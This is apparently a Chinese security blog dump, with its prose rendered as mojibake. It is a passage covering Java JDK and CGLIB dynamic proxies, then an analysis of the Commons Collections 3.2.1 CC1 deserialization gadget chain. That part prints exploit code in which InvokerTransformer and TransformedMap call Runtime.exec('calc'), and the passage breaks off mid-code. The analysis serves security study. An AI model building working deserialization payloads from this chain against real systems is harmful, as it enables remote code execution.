é‚£ä¹ˆæ—¢ç„¶ä»£ç†å¯¹è±¡æ˜¯é‡å†™çš„æ¥å£çš„æ–¹æ³•ï¼Œè€Œproxyåˆä¸ºä»£ç†ç±»çš„å®åˆ—å¯¹è±¡ï¼Œæ‰€ä»¥åªè¦methodä¸ºæ¥å£çš„æ–¹æ³•å°±å¯ä»¥é€šè¿‡åå°„æ¥è°ƒç”¨ä»£ç†å¯¹è±¡çš„é‡å†™åçš„æ–¹æ³•ï¼š method.invoke(proxy,arg);æ‰€ä»¥æ„é€ ä¸€ä¸ªæ–°çš„Handlerï¼š // é¦–å…ˆå®ç°ä¸€ä¸ªInvocationHandlerï¼Œæ–¹æ³•è°ƒç”¨ä¼šè¢«è½¬å‘åˆ°è¯¥ç±»çš„invoke()æ–¹æ³•ï¼Œé‡å†™InvocationHandleræ¥å£çš„invokeæ–¹æ³•ã€‚ import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; ////è®¾ç½®éœ€è¦ä»£ç†çš„å¯¹è±¡ } public Object invoke( Object proxy, //ä»£ç†ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°ä¼ ä¸‹æ¥çš„this.hw Method method, //è°ƒç”¨çš„æ–¹æ³•ï¼Œç”±å‰é¢å†³å®š Object[] args) //è°ƒç”¨æ–¹æ³•çš„å‚æ•°æ•°ç»„ throws Throwable { return method.invoke(hw, args);//åå°„è°ƒç”¨student.hwswent()æ–¹æ³• } }å¯ä»¥çœ‹å‡ºåªè¦è°ƒç”¨åˆ°äº†ProxyHandler.invokeæ–¹æ³•åï¼Œproxyå’Œmethodéƒ½æ˜¯æ»¡è¶³æˆ‘ä»¬æƒ³è¦çš„å°±èƒ½æˆåŠŸè°ƒç”¨åˆ°student.hwsent()æ–¹æ³•ã€‚ é‚£ä¹ˆåˆè¯¥æ€ä¹ˆæ¥è°ƒç”¨ProxyHandler.invokeæ–¹æ³•å‘¢ï¼Ÿæ¥ç€çœ‹ äºŒã€Proxy.newProxyInstanceæ–¹æ³• Proxyç±»ï¼šè´Ÿè´£åŠ¨æ€æ„å»ºä»£ç†ç±»ï¼Œæä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•ç”¨äºå¾—åˆ°ä»£ç†å¯¹è±¡ï¼š newProxyInstance(ClassLoader,Class\u003c?\u003e[],InvocationHandler);loaderæŒ‡å®šä»£ç†å¯¹è±¡çš„ç±»åŠ è½½å™¨ï¼Œinterfacesæ˜¯æŒ‡ä»£ç†å¯¹è±¡éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªæ¥å£ï¼Œhandleræ˜¯æ–¹æ³•è°ƒç”¨çš„å®é™…å¤„ç†è€…ï¼Œä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘åˆ°è¿™é‡Œ Proxy.newProxyInstanceä¼šè¿”å›ä¸€ä¸ªå®ç°äº†æŒ‡å®šæ¥å£çš„ä»£ç†å¯¹è±¡ï¼ˆè¿™é‡Œå°±æ˜¯å®ç°homeworkæ¥å£çš„studentå˜›ï¼‰ï¼Œå¯¹è¯¥å¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘ç»™handler.invoke()æ–¹æ³•ï¼ˆå‡å¦‚è¿”å›çš„ä»£ç†å¯¹è±¡åå­—æ˜¯stuï¼Œé‚£ä¹ˆstu.hwsent()æ–¹æ³•è°ƒç”¨æ—¶å°±ä¼šè½¬å‘åˆ°handler.invoke()æ–¹æ³•ï¼‰ã€‚ å¯ä»¥çœ‹åˆ°å¦‚æœhandlerä¸ºProxyHandlerï¼Œå°±èƒ½è§¦å‘ProxyHandler.invokeæ–¹æ³•äº†ï¼Œåœ¨invoke()æ–¹æ³•é‡Œæˆ‘ä»¬é™¤äº†å¯ä»¥åŠ å…¥åå°„è°ƒç”¨student.hwsentæ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åŠ å…¥å…¶ä»–ä»»ä½•é€»è¾‘ï¼Œæ¯”å¦‚ä¿®æ”¹æ–¹æ³•å‚æ•°ï¼ŒåŠ å…¥æ—¥å¿—åŠŸèƒ½ã€å®‰å…¨æ£€æŸ¥åŠŸèƒ½ç­‰ç­‰ã€‚ æ˜¯ä¸æ˜¯æ„Ÿè§‰è¿™ä¸ªé‡å†™invokeæ–¹æ³•ä¸å°±æ˜¯åƒä¸Šé¢é™æ€ä»£ç†çš„Proxyä¸­çš„hwsentä¸€æ ·å˜›ï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯å¯ä»¥é€šè¿‡å‰é¢çš„newProxyInstanceä¼ å…¥çš„å€¼æ¥åŠ¨æ€æ”¹å˜æ–¹æ³•å’Œä»£ç†å¯¹è±¡ï¼Œæ¯”é™æ€ä»£ç†æ–¹ä¾¿äº†å¾ˆå¤šã€‚ æ‰€ä»¥æ„é€ handlerçš„invokeæ–¹æ³•ï¼ˆæ¯”ä¸Šé¢å¤šåŠ ä¸€å¥è¯ï¼‰ï¼š // é¦–å…ˆå®ç°ä¸€ä¸ªInvocationHandlerï¼Œæ–¹æ³•è°ƒç”¨ä¼šè¢«è½¬å‘åˆ°è¯¥ç±»çš„invoke()æ–¹æ³•ï¼Œé‡å†™InvocationHandleræ¥å£çš„invokeæ–¹æ³•ã€‚ import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; } public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"è¯¾ä»£è¡¨å¸®å¿™äº¤ä½œä¸š\"); return method.invoke(hw, args); } }å®¢æˆ·ï¼ˆè€å¸ˆï¼šæ”¶ä½œä¸šï¼‰ // 2. ç„¶ååœ¨éœ€è¦ä½¿ç”¨studentçš„æ—¶å€™ï¼Œé€šè¿‡JDKåŠ¨æ€ä»£ç†è·å–studentçš„ä»£ç†å¯¹è±¡ã€‚ import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args){ student stu=new student(); homework home = (homework) Proxy.newProxyInstance( stu.getClass().getClassLoader(), //1. æŒ‡å®šä»£ç†å¯¹è±¡çš„ç±»åŠ è½½å™¨ new Class\u003c?\u003e[] {homework.class}, // 2. ä»£ç†éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯ä»¥æœ‰å¤šä¸ª new ProxyHandler(stu));// 3. æ–¹æ³•è°ƒç”¨çš„å®é™…å¤„ç†è€…ï¼Œä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘åˆ°è¿™é‡Œ System.out.println(\"è€å¸ˆæ”¶ä½œä¸š\"); home.hwsent(); } }æœ€åæ•ˆæœå’Œé™æ€ä»£ç†ä¸€æ ·ï¼š ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:1","tags":["java"],"title":"javaåŠ¨æ€ä»£ç†","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"CGLIBåŠ¨æ€ä»£ç† JDKåŠ¨æ€ä»£ç†è¿˜æœ‰ä¸Šé¢çš„é™æ€ä»£ç†éƒ½æ˜¯åŸºäºå…¬å…±æ¥å£çš„ï¼Œå¦‚æœå¯¹è±¡æ²¡æœ‰å®ç°æ¥å£è¯¥å¦‚ä½•ä»£ç†å‘¢ï¼ŸCGLIBä»£ç†ç™»åœº CGLIB(Code Generation Library)æ˜¯ä¸€ä¸ªåŸºäºASMçš„å­—èŠ‚ç ç”Ÿæˆåº“ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨è¿è¡Œæ—¶å¯¹å­—èŠ‚ç è¿›è¡Œä¿®æ”¹å’ŒåŠ¨æ€ç”Ÿæˆã€‚CGLIBé€šè¿‡ç»§æ‰¿æ–¹å¼å®ç°ä»£ç†ã€‚ ä½¿ç”¨cglibéœ€è¦å¼•å…¥cglibçš„jaråŒ…ï¼Œåœ¨pom.xmlä¸­æ·»åŠ ä¸‹é¢è¿™æ®µå†…å®¹ï¼Œç„¶åé‡æ–°åŠ è½½ \u003cdependency\u003e \u003cgroupId\u003ecglib\u003c/groupId\u003e \u003cartifactId\u003ecglib\u003c/artifactId\u003e \u003cversion\u003e3.3.0\u003c/version\u003e \u003c/dependency\u003eå¦‚æœå‡ºç°è¿™ä¸ªå°±æ˜¯okäº†ï¼š å‡å¦‚ç°åœ¨çš„ä»£ç†ç±»studentæ²¡æœ‰å®ç°æ¥å£ï¼š public class student{ public void hwsent() { System.out.println(\"å¼ ä¸‰äº¤ä½œä¸š\"); } }å’Œ jdk åŠ¨æ€ä»£ç†å·®ä¸å¤š é¦–å…ˆå®ç°ä¸€ä¸ªMethodInterceptorï¼Œæ–¹æ³•è°ƒç”¨ä¼šè¢«è½¬å‘åˆ°è¯¥ç±»çš„intercept()æ–¹æ³•ã€‚ ç„¶ååœ¨éœ€è¦ä½¿ç”¨studentçš„æ—¶å€™ï¼Œé€šè¿‡CGLIBåŠ¨æ€ä»£ç†è·å–ä»£ç†å¯¹è±¡ã€‚ ä¸€ã€MethodInterceptor.intercept()æ–¹æ³• å¯¹å…¶è¿›è¡Œé‡å†™ï¼š import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; public class RentMethodInterceptor implements MethodInterceptor { public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { System.out.println(\"è¯¾ä»£è¡¨å¸®å¿™äº¤ä½œä¸š\"); return proxy.invokeSuper(obj, args); } }obj: è¡¨ç¤ºä»£ç†å¯¹è±¡ï¼Œmethod: è¡¨ç¤ºæ­£åœ¨è¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œargs: è¡¨ç¤ºæ–¹æ³•è°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°æ•°ç»„ï¼Œproxy: è¡¨ç¤ºç”¨äºè°ƒç”¨åŸå§‹æ–¹æ³•çš„ MethodProxy å¯¹è±¡ï¼ˆæ¯”ä¸Šé¢çš„InvocationHandler.invokeæ–¹æ³•å¤šäº†ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿæ­£æ˜¯è¿™ä¸ªå‚æ•°å¯ä»¥ä½¿å…¶åœ¨æ²¡æœ‰æ¥å£ä¾ç„¶èƒ½å®ç°åŠ¨æ€ä»£ç†ï¼‰ è‡³äºproxy.invokeSuper(obj, args);è¿™é‡Œçš„æ–¹æ³•è°ƒç”¨æˆ‘å°±æ²¡æ·±å…¥è·Ÿè¿›äº†ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯proxyæ˜¯ä¸ªä»£ç†ç±»ï¼Œè€Œproxy.invokeSuper(obj, args)æ˜¯è°ƒç”¨ä»£ç†ç±»çš„çˆ¶ç±»ï¼ˆè¢«ä»£ç†ç±»ï¼‰çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ„Ÿè§‰ä¸ç”¨æ€ä¹ˆç®¡ï¼Œè¿™æ˜¯è¿™ä¸ªå·¥å…·è‡ªå·±çš„æ„é€ ã€‚ äºŒã€Enhancerç±» æ„é€ ï¼š import net.sf.cglib.proxy.Enhancer; public class Main{ public static void main(String[] args){ student stu=new student(); Enhancer en = new Enhancer(); //å·¥å…·ç±» en.setSuperclass(stu.getClass()); //è®¾ç½®çˆ¶ç±» en.setCallback(new RentMethodInterceptor()); //è®¾ç½®å›è°ƒå‡½æ•° student proxy = (student) en.create(); //ä»£ç†å¯¹è±¡ //ä¸Šé¢çš„æ­¥éª¤å°±ç†è§£ä¸ºè¿™ä¸ªå·¥å…·ä½¿ç”¨Enhancerç±»è¿›è¡Œä»£ç†çš„ç›¸å…³è®¾ç½®å§ System.out.println(\"è€å¸ˆæ”¶ä½œä¸š\"); //æ‰§è¡Œä»£ç†å¯¹è±¡æ–¹æ³• proxy.hwsent(); } } ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:2","tags":["java"],"title":"javaåŠ¨æ€ä»£ç†","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"Commons Collectionsç®€ä»‹ Apache Commons Collections æ˜¯ä¸€ä¸ªæ‰©å±•äº†Java æ ‡å‡†åº“é‡Œçš„Collection ç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ ä½œä¸ºApache å¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼Œè¢«å¹¿æ³›è¿ç”¨äºå„ç§Java åº”ç”¨çš„å¼€å‘ã€‚ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:1:0","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"ç¯å¢ƒé…ç½® jdkç‰ˆæœ¬ï¼šjdk8u71ä»¥ä¸‹ï¼Œå› ä¸ºåœ¨è¯¥jdkç‰ˆæœ¬ä»¥ä¸Šè¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤äº† ä¸‹è½½é“¾æ¥ï¼šhttps://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html ä¸€ã€ä¾èµ–é…ç½® å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„mavené¡¹ç›®ï¼š ç„¶ååœ¨æ–‡ä»¶pom.xmlçš„ä¸­æ·»åŠ ï¼ˆè¿™é‡Œæ˜¯åˆ†æCommons Collections3.2.1ç‰ˆæœ¬ä¸‹çš„ä¸€æ¡ååºåˆ—åŒ–æ¼æ´é“¾ï¼‰ï¼š \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003eå®Œæˆåé‡æ–°åŠ è½½ä¸€ä¸‹å³å¯ã€‚ äºŒã€æºç é…ç½® è¿™ä¸ªä¹Ÿæ˜¯éœ€è¦é…ç½®çš„ï¼Œå› ä¸ºåé¢ä¼šç”¨åˆ°jdkä¸­çš„ä¸€äº›ç±»ï¼Œè€Œè¿™äº›ç±»æ˜¯classæ–‡ä»¶ï¼Œä¸åˆ©äºæˆ‘ä»¬åˆ†æï¼Œæˆ‘ä»¬éœ€è¦å®ƒçš„.javaæ–‡ä»¶ï¼Œè¿™å°±éœ€è¦ä¸‹è½½å…¶å¯¹åº”æºç ã€‚ ä¸‹è½½ï¼šhttps://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 ç‚¹å‡»zipä¸‹è½½åè§£å‹ï¼Œåœ¨/src/share/classesä¸­æ‰¾åˆ°sunæ–‡ä»¶ï¼ŒæŠŠå…¶å¤åˆ¶åˆ°jdkä¸­src.zipçš„è§£å‹æ–‡ä»¶ ç„¶ååœ¨ideaä¸­çš„é¡¹ç›®ç»“æ„å¤„åŠ è½½æºè·¯å¾„ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:2:0","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"é“¾å­åˆ†æ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:0","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"ç»ˆç‚¹ç±» ç»ˆç‚¹ç±»å°±æ˜¯é“¾å­çš„æœ€åº•ç«¯è°ƒç”¨å±é™©å‡½æ•°çš„åœ°æ–¹ï¼Œä½†è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å…¥æ‰‹çš„åœ°æ–¹ã€‚ æ¥å£Transformaerçš„tranformæ–¹æ³•ï¼š ç„¶åçœ‹ä¸€ä¸‹å“ªäº›ç±»å®ç°äº†è¯¥æ¥å£ï¼ˆIDEAä¸­å¿«æ·é”®ï¼šctrl+alt+bï¼‰ï¼š ChainedTransformer è¿™ä¸ªç±»ä¸­çš„transformæ–¹æ³•èµ·åˆ°ä¸ªé“¾å¼è°ƒç”¨çš„ä½œç”¨ï¼Œå°±æ˜¯æŠŠå‰ä¸€æ¬¡çš„è¾“å‡ºå½“ä½œåä¸€æ¬¡çš„è¾“å…¥ã€‚ ConstantTransformer å¯ä»¥çœ‹åˆ°è¯¥ç±»æ˜¯æ¥å—ä¸€ä¸ªä»»æ„å¯¹è±¡ç„¶åéƒ½è¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œè€Œè¯¥å¸¸é‡åˆæ˜¯ç”±æ„é€ å‡½æ•°æ§åˆ¶çš„ã€‚ InvokerTransformer è¿™ä¸ªç±»ä¸­çš„transformæ–¹æ³•å®ç°äº†ä¸ªä»»æ„æ–¹æ³•è°ƒç”¨ï¼ˆå› ä¸ºå…¶ä¸­çš„å˜é‡å¯ä»¥ç”±æ„é€ å‡½æ•°æ§åˆ¶ï¼‰ã€‚å¯ä»¥åˆ©ç”¨å…¶æ„é€ æ¶æ„æ–¹æ³•è¿›è¡Œä»£ç æ‰§è¡Œã€‚ æµ‹è¯•ä¸€ä¸‹ï¼š package org.example; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test{ public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); in.transform(Runtime.getRuntime()); } } å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿé€šè¿‡è°ƒç”¨è¯¥ç±»çš„transformæ–¹æ³•è¿›è¡Œæ¶æ„æ–¹æ³•è°ƒç”¨ä»è€Œå‘½ä»¤æ‰§è¡Œã€‚å…¶å®å°±æ˜¯å…¶å®ç°äº†ä¸ªç®€å•çš„åå°„åŠŸèƒ½ï¼Œè®©æˆ‘ä»¬æŠŠåŸæœ¬çš„ä¸¤è¡Œå†™æˆäº†ä¸€è¡Œã€‚é‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯ç»ˆç‚¹ç±»äº†ã€‚ åœ¨æ­£å¸¸ååºåˆ—åŒ–åˆ†ææ€è·¯ä¸­å…¶å®å°±æ‰¾ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰¾å“ªä¸ªç±»ä¸­çš„æ–¹æ³•æœ‰è°ƒç”¨å±é™©æ–¹æ³•ï¼ˆç»ˆç‚¹ç±»ï¼‰ï¼Œç¬¬äºŒä¸ªå°±æ˜¯é‡å†™äº†readObjectçš„ç±»ï¼ˆèµ·ç‚¹ç±»ï¼‰ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡Œçš„InvokerTransformeræ˜¯ç»ˆç‚¹ç±»ã€‚ æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯çœ‹è°è°ƒç”¨äº†InvokerTransformer.transform()æ–¹æ³•ï¼Œ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:1","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"checkSetValue() æŸ¥æ‰¾ä¸€ä¸‹transform()çš„ç”¨æ³•ï¼ˆå°±æ˜¯çœ‹å“ªé‡Œè°ƒç”¨äº†transform()ï¼‰ï¼š å‘ç°TransformedMapç±»çš„ checkSetValue()é‡Œä½¿ç”¨äº† valueTransformerè°ƒç”¨transform()ï¼Œè¿™ä¸ªvalueTransformerçœ‹åå­—å°±éå¸¸å¯ç–‘ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯å¯æ§çš„å‚æ•°ï¼Œè·Ÿè¿›åˆ°TransformedMapç±»ä¸­ï¼š çœ‹åˆ°å‚æ•°valueTransformeræ˜¯ä¿æŠ¤+finalå±æ€§ï¼Œä½†å‘ç°è¯¥ç±»çš„æ„é€ å‡½æ•°å¯ä»¥å¯¹valueTransformerè¿›è¡Œèµ‹å€¼ã€‚ å¯æƒœæ„é€ å‡½æ•°ä¹Ÿæ˜¯ä¿æŠ¤å±æ€§ï¼Œåªèƒ½è‡ªå·±è°ƒç”¨ã€‚ä¸è¦ç°å¿ƒç»§ç»­æ‰¾æ‰¾çœ‹è°è°ƒç”¨äº†è¯¥æ„é€ å‡½æ•°ï¼ˆæœ‰ç‚¹åƒRutimeå®ä¾‹åŒ–çš„è·å¾—ï¼Œä¸è¿‡å…¶æ˜¯ç§æœ‰å±æ€§ï¼‰ã€‚ å‘ç°æ˜¯ä¸ªå…¬æœ‰é™æ€æ–¹æ³•å¯ä»¥è°ƒç”¨ã€‚ é‚£ä¹ˆç°åœ¨å°±æ˜¯å¯ä»¥é€šè¿‡è°ƒç”¨decorateå‡½æ•°æ¥è¿›è¡ŒTransformedMapç±»å®ä¾‹åŒ–ä»è€Œè®©valueTransformerçš„å€¼ç­‰äºInvokerTransformerã€‚ ç„¶åå°±æ˜¯è¦è°ƒç”¨checkSetValue() æ–¹æ³•æ¥å®ç°ä¸Šé¢InvokerTransformerä¸­çš„transform()æ–¹æ³•ï¼Œä½†æ˜¯ä»ä¸Šé¢ä¸éš¾å‘ç°checkSetValue()æ˜¯ä¸ªä¿æŠ¤å±æ€§çš„å‡½æ•°ï¼Œæ‰€ä»¥åˆè¦å»æ‰¾æ‰¾è°è°ƒç”¨äº†checkSetValue()æ–¹æ³•ã€‚ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:2","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"setValue() å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ªç»“æœï¼Œè·Ÿè¿›è¯¥ç±»çœ‹çœ‹ï¼š æ˜¯ä¸ªå­ç±»é‡Œé¢è°ƒç”¨çš„ï¼Œå¹¶ä¸”å®ƒçš„æ„é€ æ–¹æ³•æ˜¯ä¿æŠ¤å±æ€§ï¼ŒsetValueæ–¹æ³•å€’æ˜¯å…¬æœ‰å±æ€§ï¼Œä½†çœ‹æ¥æ˜¯ä¸èƒ½ç›´æ¥å®åˆ—åŒ–æ¥è°ƒç”¨setValue()æ–¹æ³•äº†ï¼Œ ä½†æ˜¯è¿™é‡ŒæŸ¥çœ‹è¯¥æ–¹æ³•è°ƒç”¨ç»“æœå¤ªå¤šäº†ï¼Œæœ‰38ä¸ªç»“æœï¼Œä¸»è¦æ˜¯æˆ‘ä¹Ÿçœ‹ä¸æ‡‚æ€ä¹ˆè°ƒç”¨çš„ã€‚å…ˆç›´æ¥ç…§ç€å¸ˆå‚…ä»¬çš„æ„é€ è°ƒç”¨ä¸€ä¸‹å§ï¼š package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//é™æ€æ–¹æ³•staicä¿®é¥°ç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨ for(Map.Entry entry : t.entrySet()){ entry.setValue(Runtime.getRuntime()); } } }è¿è¡Œç»“æœï¼š å¤§æ¦‚è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™é‡Œentry.setValue(Runtime.getRuntime());ä¼šè°ƒç”¨åˆ°MapEntryä¸­çš„setValueæ–¹æ³•ï¼ˆè™½ç„¶è°ƒè¯•ä¸€ä¸‹ä¹ŸçŸ¥é“ï¼‰ã€‚è¿™é‡Œå…¶å®å°±æ˜¯åœ¨éå†Mapä¸­çš„é”®å€¼å¯¹ï¼Œè€Œè¿™é‡ŒMapæ˜¯TransformedMapå¯¹è±¡ä¿®é¥°åçš„é”®å€¼ï¼ŒTransformedMapæ˜¯ç»§æ‰¿çš„AbstractInputCheckedMapDecoratorç±»ï¼ŒAbstractInputCheckedMapDecoratorç±»åˆç»§æ‰¿AbstractMapDecoratorç±»ï¼ŒMapEntryä¹Ÿæ˜¯AbstractMapDecoratorçš„å‰¯ç±»ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨setValueçš„æ—¶å€™å°±ä¼šè°ƒç”¨åˆ°é‡æ–°åçš„setValueæ–¹æ³•ä¹Ÿå°±æ˜¯MapEntryä¸­çš„setValueæ–¹æ³•ã€‚ ï¼ˆå…¶å®æ„Ÿè§‰å°±åƒååºåˆ—åŒ–æœ€åŸºç¡€çš„readObjectæ–¹æ³•é‡å†™ä¸€æ ·ï¼Œä¸ºä»€ä¹ˆå°±ä¸€å®šä¼šè°ƒç”¨åˆ°é‡å†™readObjectæ–¹æ³•ï¼Œå› ä¸ºåºåˆ—åŒ–çš„å¯¹è±¡å°±æ˜¯è¿™ä¸ªç±»å˜›ã€‚ï¼‰ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:3","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"readObject() ä½†æ˜¯å¾ˆæ˜¾ç„¶è¿™é‡Œå¹¶ä¸æ˜¯ç»ˆç‚¹é“¾ï¼Œå› ä¸ºè¿˜æ²¡æœ‰æ¶‰åŠåˆ°ååºåˆ—åŒ–ã€‚æ‰€ä»¥è¿˜æ˜¯å¾—æ‰¾è°è°ƒç”¨äº†setValue()æ–¹æ³•ï¼Œä¸è¿‡é€šè¿‡ä¸Šé¢çš„è‡ªå·±æ„é€ è°ƒç”¨æ¥çœ‹ï¼Œæˆ‘ä»¬è¦æ‰¾çš„ç±»é‡Œé¢è°ƒç”¨setValueæ–¹æ³•ä¼°è®¡ä¹Ÿæ˜¯ä»¥å·®ä¸å¤šçš„å½¢å¼æ¥è°ƒç”¨çš„ã€‚ æœ€ååœ¨AnnotationInvocationHandleç±»ä¸­æ‰¾åˆ°äº†ç¬¦åˆæ¡ä»¶çš„æƒ…å†µã€‚ memberValueå‚æ•°å¯æ§ï¼Œè€Œä¸”å‘ç°è¿˜åœ¨readObjectæ–¹æ³•é‡Œé¢ï¼Œè¿™ä¸å¦¥å¦¥èµ·ç‚¹ç±»äº†å˜›ã€‚ ä½†å‘ç°è¿™ä¸ªæ„é€ æ–¹æ³•å‰é¢æ²¡æœ‰publicå±æ€§ï¼Œé‚£ä¹ˆå°±æ˜¯defaultç±»å‹ã€‚åœ¨javaä¸­ï¼Œdefaultç±»å‹åªèƒ½åœ¨æœ¬åŒ…è¿›è¡Œè°ƒç”¨ã€‚è¯´æ˜è¿™ä¸ªç±»åªèƒ½åœ¨sun.reflect.annotationè¿™ä¸ªåŒ…ä¸‹è¢«è°ƒç”¨ã€‚ æˆ‘ä»¬è¦æƒ³åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œéœ€è¦ç”¨åˆ°åå°„æ¥è§£å†³ï¼Œè¿›è¡Œæ„é€ : package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//é™æ€æ–¹æ³•staicä¿®é¥°ç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨ Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor 